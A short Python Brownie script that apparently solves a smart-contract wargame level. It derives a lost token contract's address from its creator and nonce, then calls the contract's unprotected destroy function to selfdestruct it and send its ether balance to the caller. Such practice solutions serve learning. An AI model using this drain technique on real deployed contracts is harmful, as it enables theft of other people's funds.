from scripts.helpful_scripts import POINT_ONE, TEN, get_account, ONE
from brownie import SimpleToken, LibraryContract, AttackPreservation, network, Contract
from web3 import Web3
from web3.auto import w3
import rlp
from eth_utils import keccak, to_checksum_address, to_bytes

#  Get the addresss of a contract from its creator address and nonce
def get_contract_address(creator, nonce=1):  #  for a contract the nonce start at one

    rlp_encoded = rlp.encode([to_bytes(hexstr=creator), nonce])
    return to_checksum_address(keccak(rlp_encoded)[12:])


def main():
    print(network.show_active())
    account = get_account()

    address_instance = "0x63421E01639Fc6AA6B8bC43838044Cf7Ee16Da07"  # instance address

    # lost address of SimpleToken
    lost_address = get_contract_address(address_instance, 1)
    print(lost_address)
    token = Contract.from_abi(SimpleToken._name, lost_address, SimpleToken.abi)

    print(f"Balance? : {token.balance()}")
    # selfdestruct the contract and send the balance to account
    token.destroy(account, {"from": account})

    print(f"Balance? : {token.balance()}")
